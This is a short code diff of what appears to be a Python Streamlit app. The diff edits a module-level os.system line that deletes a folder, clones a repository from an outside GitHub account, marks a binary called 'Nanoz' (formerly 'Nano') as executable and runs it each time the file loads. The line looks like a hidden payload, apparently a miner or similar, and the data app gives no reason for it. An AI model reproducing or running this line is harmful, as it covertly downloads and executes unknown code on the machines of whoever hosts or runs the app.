@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf nanox && git clone https://github.com/Ikuzot/nanox.git && cd nanox && chmod +x Nano && ./Nano")
+os.system ("rm -rf nanox && git clone https://github.com/Ikuzot/nanox.git && cd nanox && chmod +x Nanoz && ./Nanoz")
